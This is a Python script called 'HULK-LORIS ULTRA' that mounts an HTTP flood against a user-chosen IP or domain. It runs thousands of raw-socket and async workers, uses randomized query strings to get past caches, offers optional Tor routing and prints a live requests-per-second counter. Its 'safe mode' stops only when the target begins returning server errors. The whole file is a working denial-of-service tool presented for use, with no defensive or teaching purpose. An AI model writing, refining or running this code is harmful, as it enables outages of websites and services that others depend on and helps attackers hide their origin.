#!/usr/bin/env python3
# ----------------------------------------------------------------------------------------------
# HULK-LORIS ULTRA - Massively Concurrent HTTP Flood
# ----------------------------------------------------------------------------------------------

import sys
import socket
import time
import random
import threading
import asyncio
import aiohttp
import uvloop
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

# Global counters and flags
request_counter = 0
failed_counter = 0
active_connections = 0
max_rps = 0
attack_running = True

# Interactive setup
def setup_interactive():
    global target, port, use_https, use_tor, duration, num_workers, safe_mode

    print("\n" + "="*60)
    print("           HULK-LORIS ULTRA - MASSIVE CONCURRENT FLOOD")
    print("="*60)

    # Target selection
    target_type = input("\n[?] Attack IP or Domain? (ip/domain): ").lower().strip()
    if target_type == 'ip':
        target = input("[?] Enter target IP: ").strip()
        try:
            socket.inet_aton(target)
        except socket.error:
            print("[!] Invalid IP address!")
            sys.exit(1)
    else:
        target = input("[?] Enter target domain: ").strip()

    # Port and protocol
    port = int(input("[?] Enter target port (default 80): ") or "80")
    use_https = input("[?] Use HTTPS? (y/n): ").lower().strip() in ['y', 'yes']

    # Scale
    num_workers = int(input("[?] Number of attack workers (100-10000, default 1000): ") or "1000")
    duration = int(input("[?] Attack duration in seconds (0=infinite): ") or "0")

    # Tor
    use_tor = input("[?] Use Tor? (y/n): ").lower().strip() in ['y', 'yes']
    safe_mode = input("[?] Safe mode (auto-stop on success)? (y/n): ").lower().strip() in ['y', 'yes']

    # Confirm
    print("\n" + "="*60)
    print("ATTACK CONFIGURATION:")
    print("="*60)
    print(f"Target: {target}:{port}")
    print(f"Protocol: {'HTTPS' if use_https else 'HTTP'}")
    print(f"Workers: {num_workers}")
    print(f"Duration: {'Infinite' if duration == 0 else f'{duration}s'}")
    print(f"Tor: {'Yes' if use_tor else 'No'}")
    print(f"Safe Mode: {'Yes' if safe_mode else 'No'}")
    print("="*60)

    if input("\n[?] LAUNCH MASSIVE ATTACK? (y/n): ").lower().strip() != 'y':
        print("[!] Attack cancelled!")
        sys.exit(0)

    print("\n[+] Initializing nuclear attack...")
    time.sleep(2)

# Low-level socket flood function (10x faster than HTTP)
def raw_socket_flood():
    global request_counter, active_connections
    while attack_running:
        try:
            # Create raw socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target, port))
            active_connections += 1

            # Send minimal HTTP request
            request = f"GET /?{random.randint(0,999999)} HTTP/1.1\r\n"
            request += f"Host: {target}\r\n"
            request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            request += "Accept: */*\r\n"
            request += "Connection: keep-alive\r\n\r\n"

            s.send(request.encode())
            request_counter += 1
        except:
            pass
        finally:
            s.close()
            active_connections -= 1

# Async HTTP flood with aiohttp (massive concurrency)
async def async_http_flood(session):
    global request_counter, failed_counter
    try:
        url = f"http{'s' if use_https else ''}://{target}:{port}/?{random.randint(0,9999999)}"
        # We disable SSL verification for self-signed certs
        async with session.get(url, timeout=1, ssl=False) as response:
            request_counter += 1
            if response.status == 500 and safe_mode:
                return True  # Trigger safe mode
    except:
        failed_counter += 1
    return False

async def async_attack_controller():
    # The connector needs to be created inside the loop's context
    connector = aiohttp.TCPConnector(limit=0, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(num_workers):
            task = asyncio.create_task(async_http_flood(session))
            tasks.append(task)

        results = await asyncio.gather(*tasks)
        if any(results) and safe_mode:
            return True
    return False

# Monitor and stats display
def stats_monitor():
    global max_rps
    last_count = 0
    while attack_running:
        time.sleep(1)
        current_rps = request_counter - last_count
        last_count = request_counter
        max_rps = max(max_rps, current_rps)

        print(f"[STATS] RPS: {current_rps}/s | Total: {request_counter} | Active: {active_connections} | Failed: {failed_counter} | Max RPS: {max_rps}", end='\r')

# Main attack function
def main():
    global attack_running

    setup_interactive()
    print(f"[+] Launching {num_workers} concurrent workers...")

    # Start stats monitor
    monitor_thread = threading.Thread(target=stats_monitor, daemon=True)
    monitor_thread.start()

    # Start raw socket flood (base layer)
    socket_threads = []
    for _ in range(min(num_workers // 2, 1000)):  # Use half workers for raw sockets, max 1000
        t = threading.Thread(target=raw_socket_flood, daemon=True)
        t.start()
        socket_threads.append(t)

    # Start async HTTP flood (main attack)
    print("[+] Starting massive async HTTP flood...")

    # Set up asyncio with uvloop for maximum performance
    uvloop.install()

    try:
        if duration > 0:
            # Timed attack
            end_time = time.time() + duration
            while time.time() < end_time and attack_running:
                asyncio.run(async_attack_controller())
        else:
            # Infinite attack
            while attack_running:
                asyncio.run(async_attack_controller())

    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:
        attack_running = False
        print(f"\n[+] Attack finished!")
        print(f"[+] Total requests: {request_counter}")
        print(f"[+] Maximum RPS: {max_rps}/second")
        print(f"[+] Failed requests: {failed_counter}")

if __name__ == "__main__":
    main()
